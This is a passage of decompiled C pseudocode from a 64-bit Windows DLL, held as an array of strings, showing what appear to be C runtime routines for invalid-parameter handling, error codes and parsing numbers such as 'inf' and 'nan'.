    "    v7 = *a5;",
    "LABEL_5:",
    "    v16 = 1;",
    "    v15 = v7;",
    "    goto LABEL_6;",
    "  }",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v7 = *(_OWORD *)&off_18004B498;",
    "    goto LABEL_5;",
    "  }",
    "LABEL_6:",
    "  if ( !a4 || !a2 || !a3 )",
    "  {",
    "    v17 = 22;",
    "    goto LABEL_14;",
    "  }",
    "  v8 = sub_1800175C0(a1, a2, a3, a4, (__int64)v13, a6);",
    "  v9 = v8;",
    "  if ( v8 < 0 )",
    "    *a2 = 0;",
    "  if ( v8 == -2 )",
    "  {",
    "    v17 = 34;",
    "LABEL_14:",
    "    v18 = 1;",
    "    sub_18001A598(0, 0, 0, 0, 0, (__int64)v13);",
    "    v9 = -1;",
    "  }",
    "  if ( v16 == 2 )",
    "    *(_DWORD *)(v13[0] + 936LL) &= ~2u;",
    "  if ( v18 )",
    "  {",
    "    v10 = v17;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v13) + 32) = v10;",
    "  }",
    "  if ( v20 )",
    "  {",
    "    v11 = v19;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v13) + 36) = v11;",
    "  }",
    "  return v9;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001A2CC(XSAVE_FORMAT *a1)",
    "{",
    "  return sub_180023374(a1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001A2E0(__int64 a1)",
    "{",
    "  __int64 v1; // rsi",
    "  __int64 v3; // rax",
    "  DWORD v4; // ecx",
    "  DWORD dwErrCode; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v1 = *(_QWORD *)a1;",
    "  if ( !*(_QWORD *)a1 )",
    "  {",
    "    dwErrCode = GetLastError();",
    "    if ( !*(_BYTE *)(a1 + 16) )",
    "    {",
    "      *(_QWORD *)(a1 + 8) = 0;",
    "      *(_BYTE *)(a1 + 16) = 1;",
    "    }",
    "    v3 = sub_18002653C(&dwErrCode);",
    "    v4 = dwErrCode;",
    "    v1 = v3;",
    "    *(_QWORD *)a1 = v3;",
    "    SetLastError(v4);",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001A34C(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rbx",
    "  DWORD LastError; // eax",
    "",
    "  v2 = 0;",
    "  if ( *(_BYTE *)(a2 + 16) )",
    "  {",
    "    v2 = *(_QWORD *)(a2 + 8);",
    "  }",
    "  else",
    "  {",
    "    LastError = GetLastError();",
    "    *(_QWORD *)(a2 + 8) = 0;",
    "    *(_BYTE *)(a2 + 16) = 1;",
    "    SetLastError(LastError);",
    "  }",
    "  return a1 + 8 * v2;",
    "}",
    "",
    "",
    "LONG __fastcall sub_18001A398(__int64 a1, int a2, int a3)",
    "{",
    "  unsigned int v5; // ebx",
    "  ULONG64 Rip; // r14",
    "  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v7; // rax",
    "  BOOL v8; // edi",
    "  LONG result; // eax",
    "  unsigned __int64 ImageBase; // [rsp+40h] [rbp-C0h] BYREF",
    "  struct _EXCEPTION_POINTERS ExceptionInfo; // [rsp+48h] [rbp-B8h] BYREF",
    "  unsigned __int64 EstablisherFrame; // [rsp+58h] [rbp-A8h] BYREF",
    "  PVOID HandlerData; // [rsp+60h] [rbp-A0h] BYREF",
    "  _DWORD v14[4]; // [rsp+70h] [rbp-90h] BYREF",
    "  DWORD64 v15; // [rsp+80h] [rbp-80h]",
    "  struct _CONTEXT ContextRecord; // [rsp+110h] [rbp+10h] BYREF",
    "  DWORD64 retaddr; // [rsp+608h] [rbp+508h]",
    "  __int64 v18; // [rsp+610h] [rbp+510h] BYREF",
    "",
    "  v5 = a1;",
    "  if ( (_DWORD)a1 != -1 )",
    "    sub_1800125DC(a1);",
    "  sub_1800368A0(v14, 0, 152);",
    "  sub_1800368A0(&ContextRecord, 0, 1232);",
    "  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)v14;",
    "  ExceptionInfo.ContextRecord = &ContextRecord;",
    "  RtlCaptureContext(&ContextRecord);",
    "  Rip = ContextRecord.Rip;",
    "  v7 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, 0);",
    "  if ( v7 )",
    "    RtlVirtualUnwind(0, ImageBase, Rip, v7, &ContextRecord, &HandlerData, &EstablisherFrame, 0);",
    "  ContextRecord.Rip = retaddr;",
    "  v14[0] = a2;",
    "  ContextRecord.Rsp = (DWORD64)&v18;",
    "  v15 = retaddr;",
    "  v14[1] = a3;",
    "  v8 = IsDebuggerPresent();",
    "  SetUnhandledExceptionFilter(0);",
    "  result = UnhandledExceptionFilter(&ExceptionInfo);",
    "  if ( !result && !v8 && v5 != -1 )",
    "    return sub_1800125DC(v5);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001A4FC(int a1, int a2, int a3, int a4, __int64 a5)",
    "{",
    "  __int64 result; // rax",
    "  int v6; // ebx",
    "  int v7; // ebx",
    "  _QWORD v8[2]; // [rsp+30h] [rbp-40h] BYREF",
    "  char v9; // [rsp+40h] [rbp-30h]",
    "  __int128 v10; // [rsp+48h] [rbp-28h]",
    "  char v11; // [rsp+58h] [rbp-18h]",
    "  int v12; // [rsp+5Ch] [rbp-14h]",
    "  char v13; // [rsp+60h] [rbp-10h]",
    "  int v14; // [rsp+64h] [rbp-Ch]",
    "  char v15; // [rsp+68h] [rbp-8h]",
    "",
    "  v8[0] = 0;",
    "  v9 = 0;",
    "  v11 = 0;",
    "  v13 = 0;",
    "  v15 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v11 = 1;",
    "    v10 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  result = sub_18001A598(a1, a2, a3, a4, a5, (__int64)v8);",
    "  if ( v11 == 2 )",
    "  {",
    "    result = v8[0];",
    "    *(_DWORD *)(v8[0] + 936LL) &= ~2u;",
    "  }",
    "  if ( v13 )",
    "  {",
    "    v6 = v12;",
    "    result = sub_1800185B0((__int64)v8);",
    "    *(_DWORD *)(result + 32) = v6;",
    "  }",
    "  if ( v15 )",
    "  {",
    "    v7 = v14;",
    "    result = sub_1800185B0((__int64)v8);",
    "    *(_DWORD *)(result + 36) = v7;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001A598(__int64 a1, __int64 a2, __int64 a3, unsigned int a4, __int64 a5, __int64 a6)",
    "{",
    "  __int64 v10; // rax",
    "  __int64 (__fastcall *v11)(__int64, __int64, __int64, _QWORD, __int64); // rax",
    "  __int64 (__fastcall *v13)(__int64, __int64, __int64, _QWORD, __int64); // r11",
    "",
    "  v10 = sub_18001A2E0(a6);",
    "  if ( v10 )",
    "  {",
    "    v11 = *(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, __int64))(v10 + 952);",
    "    if ( v11 )",
    "      return v11(a1, a2, a3, a4, a5);",
    "  }",
    "  v13 = (__int64 (__fastcall *)(__int64, __int64, __int64, _QWORD, __int64))__ROR8__(",
    "                                                                              _security_cookie",
    "                                                                            ^ *(_QWORD *)sub_18001A34C(",
    "                                                                                           (__int64)&qword_18004D2E8,",
    "                                                                                           a6),",
    "                                                                              _security_cookie & 0x3F);",
    "  if ( !v13 )",
    "  {",
    "    sub_18001A6B4(a1, a2, a3, a4, a5);",
    "    __debugbreak();",
    "  }",
    "  return v13(a1, a2, a3, a4, a5);",
    "}",
    "",
    "",
    "void __cdecl invalid_parameter_noinfo()",
    "{",
    "  sub_18001A4FC(0, 0, 0, 0, 0);",
    "}",
    "",
    "",
    "void __cdecl  invalid_parameter_noinfo_noreturn()",
    "{",
    "  sub_18001A4FC(0, 0, 0, 0, 0);",
    "  sub_18001A6B4(0, 0, 0, 0, 0);",
    "  JUMPOUT(0x18001A6B2LL);",
    "}",
    "",
    "",
    "BOOL sub_18001A6B4()",
    "{",
    "  HANDLE CurrentProcess; // rax",
    "",
    "  if ( IsProcessorFeaturePresent(0x17u) )",
    "    __fastfail(5u);",
    "  sub_18001A398(2, -1073740777, 1);",
    "  CurrentProcess = GetCurrentProcess();",
    "  return TerminateProcess(CurrentProcess, 0xC0000417);",
    "}",
    "",
    "",
    "__int64 sub_18001A6FC()",
    "{",
    "  __int64 v0; // rax",
    "  __int64 v2; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v0 = sub_1800262FC();",
    "  v2 = *(_QWORD *)(v0 + 144);",
    "  sub_180024BB0(v0, &v2);",
    "  return *(_QWORD *)(v2 + 248);",
    "}",
    "",
    "",
    "// attributes: thunk",
    "__int64 __fastcall sub_18001A730(__int64 a1, __int64 a2)",
    "{",
    "}__int64 __fastcall sub_18001A780(unsigned int a1)",
    "{",
    "  __int64 v2; // rax",
    "  unsigned int *v3; // rax",
    "  int v4; // ebx",
    "  __int64 result; // rax",
    "  _DWORD *v6; // rcx",
    "",
    "  v2 = sub_180026474();",
    "  if ( v2 )",
    "    v3 = (unsigned int *)(v2 + 36);",
    "  else",
    "    v3 = (unsigned int *)&unk_18004B2BC;",
    "  *v3 = a1;",
    "  v4 = sub_18001A738(a1);",
    "  result = sub_180026474();",
    "  v6 = &unk_18004B2B8;",
    "  if ( result )",
    "    v6 = (_DWORD *)(result + 32);",
    "  *v6 = v4;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001A7C8(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  *(_BYTE *)(a2 + 56) = 1;",
    "  *(_DWORD *)(a2 + 52) = a1;",
    "  result = sub_18001A738(a1);",
    "  *(_DWORD *)(a2 + 44) = result;",
    "  *(_BYTE *)(a2 + 48) = 1;",
    "  return result;",
    "}",
    "",
    "",
    "void *sub_18001A7EC()",
    "{",
    "  __int64 v0; // rax",
    "",
    "  v0 = sub_180026474();",
    "  if ( v0 )",
    "    return (void *)(v0 + 36);",
    "  else",
    "    return &unk_18004B2BC;",
    "}",
    "",
    "",
    "void *sub_18001A80C()",
    "{",
    "  __int64 v0; // rax",
    "",
    "  v0 = sub_180026474();",
    "  if ( v0 )",
    "    return (void *)(v0 + 32);",
    "  else",
    "    return &unk_18004B2B8;",
    "}",
    "",
    "",
    "void __fastcall sub_18001A82C(__int64 a1, _QWORD *a2, __int64 a3)",
    "{",
    "  _QWORD v5[2]; // [rsp+20h] [rbp-38h] BYREF",
    "  __int64 v6; // [rsp+30h] [rbp-28h] BYREF",
    "  _BYTE v7[32]; // [rsp+38h] [rbp-20h] BYREF",
    "  int v8; // [rsp+60h] [rbp+8h] BYREF",
    "",
    "  if ( a2 )",
    "    *a2 = a1;",
    "  if ( a1 )",
    "  {",
    "    sub_18001B674(&v6, a3);",
    "    v5[0] = a1;",
    "    v8 = 0;",
    "    v5[1] = a2;",
    "    if ( a2 )",
    "      *a2 = a1;",
    "    if ( (unsigned int)sub_18001A97C(v7, v5, &v8) - 2 <= 1 )",
    "      *(_DWORD *)sub_18001A80C() = 34;",
    "    if ( v7[16] )",
    "      *(_DWORD *)(v6 + 936) &= ~2u;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_18001A8D4(__int64 a1, _QWORD *a2, __int64 a3)",
    "{",
    "  _QWORD v5[2]; // [rsp+20h] [rbp-38h] BYREF",
    "  __int64 v6; // [rsp+30h] [rbp-28h] BYREF",
    "  _BYTE v7[32]; // [rsp+38h] [rbp-20h] BYREF",
    "  __int64 v8; // [rsp+60h] [rbp+8h] BYREF",
    "",
    "  if ( a2 )",
    "    *a2 = a1;",
    "  if ( a1 )",
    "  {",
    "    sub_18001B674(&v6, a3);",
    "    v5[0] = a1;",
    "    v8 = 0;",
    "    v5[1] = a2;",
    "    if ( a2 )",
    "      *a2 = a1;",
    "    if ( (unsigned int)sub_18001AA1C(v7, v5, &v8) - 2 <= 1 )",
    "      *(_DWORD *)sub_18001A80C() = 34;",
    "    if ( v7[16] )",
    "      *(_DWORD *)(v6 + 936) &= ~2u;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001A97C(__int64 a1, _QWORD *a2, __int64 a3)",
    "{",
    "  _QWORD *v5; // rcx",
    "  __int64 result; // rax",
    "  unsigned int v7; // eax",
    "  _QWORD *v8; // rdx",
    "  _BYTE v9[784]; // [rsp+20h] [rbp-328h] BYREF",
    "",
    "  if ( a3 && a1 )",
    "  {",
    "    v7 = sub_18001AABC(a1, a2, v9);",
    "    result = sub_18001B324(v7, v9, a3);",
    "    v8 = (_QWORD *)a2[1];",
    "    if ( v8 )",
    "      *v8 = *a2;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    v5 = (_QWORD *)a2[1];",
    "    if ( v5 )",
    "      *v5 = *a2;",
    "    return 1;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001AA1C(__int64 a1, _QWORD *a2, __int64 a3)",
    "{",
    "  _QWORD *v5; // rcx",
    "  __int64 result; // rax",
    "  unsigned int v7; // eax",
    "  _QWORD *v8; // rdx",
    "  _BYTE v9[784]; // [rsp+20h] [rbp-328h] BYREF",
    "",
    "  if ( a3 && a1 )",
    "  {",
    "    v7 = sub_18001AABC(a1, a2, v9);",
    "    result = sub_18001B494(v7, v9, a3);",
    "    v8 = (_QWORD *)a2[1];",
    "    if ( v8 )",
    "      *v8 = *a2;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    v5 = (_QWORD *)a2[1];",
    "    if ( v5 )",
    "      *v5 = *a2;",
    "    return 1;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001AABC(__int64 *a1, char **a2, __int64 a3)",
    "{",
    "  char *v3; // r14",
    "  unsigned int v7; // ebx",
    "  char v8; // si",
    "  bool *v9; // rbp",
    "  unsigned __int8 v10; // r13",
    "  char *v11; // rcx",
    "  char v12; // dl",
    "  char *v13; // r8",
    "  int v14; // r9d",
    "  bool *v15; // rsi",
    "  char v16; // dl",
    "  unsigned int v17; // r8d",
    "  unsigned int v18; // eax",
    "  __int64 v19; // rax",
    "  bool *v20; // r15",
    "  char *v21; // rcx",
    "  char v22; // al",
    "  char v23; // cl",
    "  unsigned int v24; // eax",
    "  char *v25; // rax",
    "  char *v27; // r14",
    "  char v28; // al",
    "  char v29; // cl",
    "  char *v30; // r8",
    "  int v31; // ebx",
    "  char v32; // r10",
    "  char v33; // al",
    "  char v34; // dl",
    "  char v35; // r9",
    "  bool v36; // cc",
    "  unsigned int v37; // edx",
    "  unsigned int v38; // eax",
    "  char *v39; // r8",
    "  char *v40; // r8",
    "  bool *v41; // rax",
    "  int v42; // ebx",
    "  int *v43; // rax",
    "  int v44; // [rsp+68h] [rbp+10h] BYREF",
    "  int *v45; // [rsp+70h] [rbp+18h]",
    "  bool *v46; // [rsp+78h] [rbp+20h]",
    "",
    "  v45 = (int *)a3;",
    "  v3 = *a2;",
    "  if ( !*a2 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 7;",
    "  }",
    "  v7 = (unsigned __int8)*v3;",
    "  *a2 = v3 + 1;",
    "  LOBYTE(v44) = v7;",
    "  v8 = v7;",
    "  if ( (unsigned int)sub_18001E05C(v7, 8, a1) )",
    "  {",
    "    do",
    "    {",
    "      LOBYTE(v7) = *(*a2)++;",
    "      LOBYTE(v44) = v7;",
    "    }",
    "    while ( (unsigned int)sub_18001E05C((unsigned __int8)v7, 8, a1) );",
    "    v8 = v7;",
    "  }",
    "  v9 = (bool *)(a3 + 776);",
    "  *v9 = v8 == 45;",
    "  if ( v8 == 45 || v8 == 43 )",
    "  {",
    "    LOBYTE(v7) = *(*a2)++;",
    "    v8 = v7;",
    "    LOBYTE(v44) = v7;",
    "  }",
    "  if ( v8 == 73 || v8 == 105 )",
    "    return sub_18001AF64(&v44, a2, v3);",
    "  if ( (((_BYTE)v7 - 78) & 0xDF) == 0 )",
    "    return sub_18001B0A8(&v44, a2, v3);",
    "  v10 = 0;",
    "  if ( (_BYTE)v7 == 48 )",
    "  {",
    "    v11 = *a2;",
    "    v12 = **a2;",
    "    v13 = *a2 + 1;",
    "    *a2 = v13;",
    "    if ( ((v12 - 88) & 0xDF) != 0 )",
    "    {",
    "      *a2 = v11;",
    "      if ( v12 && *v11 != v12 )",
    "      {",
    "        *(_DWORD *)sub_18001A80C() = 22;",
    "        invalid_parameter_noinfo();",
    "      }",
    "    }",
    "    else",
    "    {",
    "      LOBYTE(v7) = *v13;",
    "      *a2 = v13 + 1;",
    "      v10 = 1;",
    "      v3 = v11;",
    "    }",
    "  }",
    "  v14 = 0;",
    "  v15 = (bool *)(v45 + 2);",
    "  v16 = 0;",
    "  v46 = (bool *)(v45 + 2);",
    "  if ( (_BYTE)v7 == 48 )",
    "  {",
    "    v16 = 1;",
    "    do",
    "      LOBYTE(v7) = *(*a2)++;",
    "    while ( (_BYTE)v7 == 48 );",
    "  }",
    "  v17 = v10 != 0 ? 15 : 9;",
    "  while ( 1 )",
    "  {",
    "    if ( (unsigned __int8)(v7 - 48) > 9u )",
    "    {",
    "      if ( (unsigned __int8)(v7 - 97) > 0x19u )",
    "        v18 = (unsigned __int8)(v7 - 65) > 0x19u ? -1 : (char)v7 - 55;",
    "      else",
    "        v18 = (char)v7 - 87;",
    "    }",
    "    else",
    "    {",
    "      v18 = (char)v7 - 48;",
    "    }",
    "    if ( v18 > v17 )",
    "      break;",
    "    v16 = 1;",
    "    if ( v15 != v9 )",
    "      *v15++ = v18;",
    "    ++v14;",
    "    LOBYTE(v7) = *(*a2)++;",
    "  }",
    "  v19 = *a1;",
    "  v20 = v46;",
    "  v44 = v14;",
    "  if ( (_BYTE)v7 == ***(_BYTE ***)(v19 + 248) )",
    "  {",
    "    LOBYTE(v7) = **a2;",
    "    v21 = *a2 + 1;",
    "    *a2 = v21;",
    "    v22 = v7;",
    "    if ( v15 == v20 && (_BYTE)v7 == 48 )",
    "    {",
    "      v16 = 1;",
    "      do",
    "      {",
    "        LOBYTE(v7) = *v21;",
    "        --v14;",
    "        *a2 = ++v21;",
    "      }",
    "      while ( (_BYTE)v7 == 48 );",
    "      v44 = v14;",
    "      v22 = v7;",
    "    }",
    "    v23 = v22;",
    "    while ( 1 )",
    "    {",
    "      if ( v22 < 48 || v23 > 57 )",
    "      {",
    "        if ( (unsigned __int8)(v7 - 97) > 0x19u )",
    "          v24 = (unsigned __int8)(v7 - 65) > 0x19u ? -1 : (char)v7 - 55;",
    "        else",
    "          v24 = (char)v7 - 87;",
    "      }",
    "      else",
    "      {",
    "        v24 = (char)v7 - 48;",
    "      }",
    "      if ( v24 > v17 )",
    "        break;",
    "      v16 = 1;",
    "      if ( v15 != v9 )",
    "        *v15++ = v24;",
    "      LOBYTE(v7) = *(*a2)++;",
    "      v23 = v7;",
    "      v22 = v7;",
    "    }",
    "  }",
    "  v25 = *a2 - 1;",
    "  *a2 = v25;",
    "  if ( !v16 )",
    "  {",
    "    if ( (_BYTE)v7 && *v25 != (_BYTE)v7 )",
    "    {",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "      invalid_parameter_noinfo();",
    "    }",
    "    *a2 = v3;",
    "    if ( !v10 )",
    "      return 7;",
    "    return 2;",
    "  }",
    "  if ( (_BYTE)v7 && *v25 != (_BYTE)v7 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  v27 = *a2;",
    "  v28 = 0;",
    "  v29 = **a2;",
    "  v30 = *a2 + 1;",
    "  *a2 = v30;",
    "  switch ( v29 )",
    "  {",
    "    case 'E':",
    "      goto LABEL_66;",
    "    case 'P':",
    "LABEL_65:",
    "      v28 = v10;",
    "      break;",
    "    case 'e':",
    "LABEL_66:",
    "      v28 = v10 ^ 1;",
    "      break;",
    "    case 'p':",
    "      goto LABEL_65;",
    "  }",
    "  v31 = 0;",
    "  if ( v28 )",
    "  {",
    "    v29 = *v30++;",
    "    *a2 = v30;",
    "    v32 = v29;",
    "    if ( v29 == 43 || (v33 = v29, v34 = v29, v29 == 45) )",
    "    {",
    "      v29 = *v30++;",
    "      *a2 = v30;",
    "      v33 = v29;",
    "      v34 = v29;",
    "    }",
    "    v35 = 0;",
    "    v36 = v33 < 48;",
    "    if ( v33 != 48 )",
    "      goto LABEL_75;",
    "    v35 = 1;",
    "    do",
    "    {",
    "      v29 = *v30++;",
    "      *a2 = v30;",
    "      v34 = v29;",
    "    }",
    "    while ( v29 == 48 );",
    "    while ( 1 )",
    "    {",
    "      v36 = v29 < 48;",
    "LABEL_75:",
    "      if ( v36 || v34 > 57 )",
    "      {",
    "        if ( (unsigned __int8)(v29 - 97) > 0x19u )",
    "        {",
    "          if ( (unsigned __int8)(v29 - 65) > 0x19u )",
    "            goto LABEL_86;",
    "          v37 = v29 - 55;",
    "        }",
    "        else",
    "        {",
    "          v37 = v29 - 87;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v37 = v29 - 48;",
    "      }",
    "      if ( v37 >= 0xA )",
    "        break;",
    "      v35 = 1;",
    "      v31 = v37 + 10 * v31;",
    "      if ( v31 > 5200 )",
    "      {",
    "        v31 = 5201;",
    "        goto LABEL_86;",
    "      }",
    "      v29 = *v30++;",
    "      *a2 = v30;",
    "      v34 = v29;",
    "    }",
    "    while ( 1 )",
    "    {",
    "LABEL_86:",
    "      if ( (unsigned __int8)(v29 - 48) > 9u )",
    "      {",
    "        if ( (unsigned __int8)(v29 - 97) > 0x19u )",
    "        {",
    "          if ( (unsigned __int8)(v29 - 65) > 0x19u )",
    "            break;",
    "          v38 = v29 - 55;",
    "        }",
    "        else",
    "        {",
    "          v38 = v29 - 87;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v38 = v29 - 48;",
    "      }",
    "      if ( v38 >= 0xA )",
    "        break;",
    "      v29 = *v30++;",
    "      *a2 = v30;",
    "    }",
    "    if ( v32 == 45 )",
    "      v31 = -v31;",
    "    if ( !v35 )",
    "    {",
    "      v39 = v30 - 1;",
    "      *a2 = v39;",
    "      if ( v29 && *v39 != v29 )",
    "      {",
    "        *(_DWORD *)sub_18001A80C() = 22;",
    "        invalid_parameter_noinfo();",
    "      }",
    "      *a2 = v27;",
    "      v30 = v27 + 1;",
    "      v29 = *v27;",
    "    }",
    "  }",
    "  v40 = v30 - 1;",
    "  *a2 = v40;",
    "  if ( v29 && *v40 != v29 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  if ( v15 == v20 )",
    "    return 2;",
    "  do",
    "  {",
    "    v41 = v15 - 1;",
    "    if ( *(v15 - 1) )",
    "      break;",
    "    --v15;",
    "  }",
    "  while ( v41 != v20 );",
    "  if ( v15 == v20 )",
    "    return 2;",
    "  if ( v31 <= 5200 )",
    "  {",
    "    if ( v31 < -5200 )",
    "      return 8;",
    "    v42 = v44 * (v10 != 0 ? 4 : 1) + v31;",
    "    if ( v42 <= 5200 )",
    "    {",
    "      if ( v42 >= -5200 )",
    "      {",
    "        v43 = v45;",
    "        *v45 = v42;",
    "        v43[1] = (_DWORD)v15 - (_DWORD)v20;",
    "        return v10;",
    "      }",
    "      return 8;",
    "    }",
    "  }",
    "  return 9;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001AF64(char *a1, _QWORD *a2, _BYTE *a3)",
    "{",
    "  __int64 v4; // rdx",
    "  unsigned int v7; // esi",
    "  char v8; // al",
    "  char v9; // cl",
    "  _BYTE *v10; // rax",
    "  __int64 v11; // rdx",
    "  char v12; // cl",
    "  _BYTE *v13; // rax",
    "",
    "  v4 = 0;",
    "  v7 = 3;",
    "  do",
    "  {",
    "    v8 = *a1;",
    "    if ( *a1 != aInf[v4] && v8 != aInf_0[v4] )",
    "    {",
    "      --*a2;",
    "      if ( v8 && *(_BYTE *)*a2 != v8 )",
    "      {",
    "        *(_DWORD *)sub_18001A80C() = 22;",
    "        invalid_parameter_noinfo();",
    "      }",
    "      v7 = 7;",
    "      goto LABEL_23;",
    "    }",
    "    ++v4;",
    "    v9 = *(_BYTE *)(*a2)++;",
    "    *a1 = v9;",
    "  }",
    "  while ( v4 != 3 );",
    "  v10 = (_BYTE *)(*a2 - 1LL);",
    "  *a2 = v10;",
    "  if ( v9 && *v10 != v9 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  a3 = (_BYTE *)*a2;",
    "  v11 = 0;",
    "  v12 = *(_BYTE *)(*a2)++;",
    "  *a1 = v12;",
    "  while ( v12 == aInity[v11] || v12 == aInity_0[v11] )",
    "  {",
    "    ++v11;",
    "    v12 = *(_BYTE *)(*a2)++;",
    "    *a1 = v12;",
    "    if ( v11 == 5 )",
    "    {",
    "      v13 = (_BYTE *)(*a2 - 1LL);",
    "      *a2 = v13;",
    "      if ( v12 && *v13 != v12 )",
    "      {",
    "        *(_DWORD *)sub_18001A80C() = 22;",
    "        invalid_parameter_noinfo();",
    "      }",
    "      return v7;",
    "    }",
    "  }",
    "  --*a2;",
    "  if ( v12 && *(_BYTE *)*a2 != v12 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "LABEL_23:",
    "  *a1 = 0;",
    "  *a2 = a3;",
    "  return v7;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001B0A8(unsigned __int8 *a1, char **a2, char *a3)",
    "{",
    "  __int64 v5; // rcx",
    "  unsigned __int64 v6; // r8",
    "  unsigned __int8 v8; // al",
    "  unsigned __int8 v9; // dl",
    "  char *v10; // rax",
    "  unsigned __int8 v11; // cl",
    "  char *v12; // rax",
    "  char *v13; // rax",
    "  __int64 result; // rax",
    "  char v15; // cl",
    "  unsigned __int8 v16; // cl",
    "  char *v17; // rax",
    "  char v18; // al",
    "  unsigned __int8 v19; // cl",
    "  char *v20; // rax",
    "  unsigned __int8 v21; // dl",
    "  bool v22; // zf",
    "",
    "  v5 = 0;",
    "  v6 = 0x180000000uLL;",
    "  do",
    "  {",
    "    v8 = *a1;",
    "    if ( *a1 != aNan[v5] && v8 != aNan_0[v5] )",
    "    {",
    "      --*a2;",
    "      if ( v8 && **a2 != v8 )",
    "      {",
    "        *(_DWORD *)sub_18001A80C() = 22;",
    "        invalid_parameter_noinfo();",
    "      }",
    "      result = 7;",
    "LABEL_43:",
    "      *a1 = 0;",
    "      *a2 = a3;",
    "      return result;",
    "    }",
    "    ++v5;",
    "    v9 = *(*a2)++;",
    "    *a1 = v9;",
    "  }",
    "  while ( v5 != 3 );",
    "  v10 = *a2 - 1;",
    "  *a2 = v10;",
    "  if ( v9 && *v10 != v9 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  a3 = *a2;",
    "  v11 = *(*a2)++;",
    "  *a1 = v11;",
    "  v12 = *a2;",
    "  if ( v11 != 40 )",
    "  {",
    "    v13 = v12 - 1;",
    "    *a2 = v13;",
    "    if ( v11 )",
    "    {",
    "      if ( *v13 != v11 )",
    "      {",
    "        *(_DWORD *)sub_18001A80C() = 22;",
    "        invalid_parameter_noinfo();",
    "      }",
    "    }",
    "    *a1 = 0;",
    "    *a2 = a3;",
    "    return 4;",
    "  }",
    "  v15 = *v12;",
    "  *a2 = v12 + 1;",
    "  *a1 = v15;",
    "  if ( (unsigned __int8)sub_18001B2DC(a1, a2, v6) )",
    "  {",
    "    v16 = *a1;",
    "    v17 = *a2 - 1;",
    "    *a2 = v17;",
    "    if ( v16 && *v17 != v16 )",
    "    {",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "      invalid_parameter_noinfo();",
    "    }",
    "    return 5;",
    "  }",
    "  v18 = sub_18001B294(a1, a2);",
    "  v19 = *a1;",
    "  if ( !v18 )",
    "  {",
    "    if ( v19 == 41 )",
    "      return 4;",
    "    v21 = *a1;",
    "    while ( v21 )",
    "    {",
    "      if ( (unsigned __int8)(v21 - 48) > 9u",
    "        && (unsigned __int8)(v21 - 97) > 0x19u",
    "        && (unsigned __int8)(v21 - 65) > 0x19u",
    "        && v21 != 95 )",
    "      {",
    "        v22 = *--*a2 == (char)v21;",
    "        goto LABEL_40;",
    "      }",
    "      v19 = *(*a2)++;",
    "      v21 = v19;",
    "      *a1 = v19;",
    "      if ( v19 == 41 )",
    "        return 4;",
    "    }",
    "    --*a2;",
    "    if ( !v19 )",
    "      goto LABEL_42;",
    "    v22 = **a2 == (char)v19;",
    "LABEL_40:",
    "    if ( !v22 )",
    "    {",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "      invalid_parameter_noinfo();",
    "    }",
    "LABEL_42:",
    "    result = 4;",
    "    goto LABEL_43;",
    "  }",
    "  v20 = *a2 - 1;",
    "  *a2 = v20;",
    "  if ( v19 && *v20 != v19 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  return 6;",
    "}",
    "",
    "",
    "char __fastcall sub_18001B294(_BYTE *a1, _QWORD *a2)",
    "{",
    "  char v2; // r8",
    "  __int64 v3; // r9",
    "  char v5; // cl",
    "",
    "  v2 = 0;",
    "  v3 = 0;",
    "  while ( *a1 == aIndInd[v3] || *a1 == aIndInd[v3 + 4] )",
    "  {",
    "    ++v3;",
